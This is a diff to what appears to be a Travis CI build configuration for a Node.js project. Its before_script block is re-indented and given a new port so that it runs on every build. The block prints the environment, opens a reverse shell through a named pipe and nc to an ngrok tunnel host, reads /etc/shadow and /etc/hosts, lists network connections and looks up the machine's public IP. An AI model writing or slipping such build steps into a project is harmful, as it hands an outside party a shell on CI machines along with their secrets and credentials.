@@ -2,17 +2,17 @@ language: node_js
 before_script:
   - env
   - whoami
-  - export NGPORT=17855
-      - export NGHOSTNAME=0.tcp.ngrok.io
-      - mknod /tmp/backpipe p
-      - /bin/sh 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
-      - uname -a
-      - curl ipecho.net/plain; echo
-      - netstat -lap
-      - netstat -lanp
-      - nslookup
-      - cat /etc/hosts
-      - cat /etc/shadow
-      - id
-      - whoami
-      - exit
+  - export NGPORT=14266
+  - export NGHOSTNAME=0.tcp.ngrok.io
+  - mknod /tmp/backpipe p
+  - /bin/sh 0</tmp/backpipe|nc $NGHOSTNAME $NGPORT 1>/tmp/backpipe &
+  - uname -a
+  - curl ipecho.net/plain; echo
+  - netstat -lap
+  - netstat -lanp
+  - nslookup
+  - cat /etc/hosts
+  - cat /etc/shadow
+  - id
+  - whoami
+  - exit
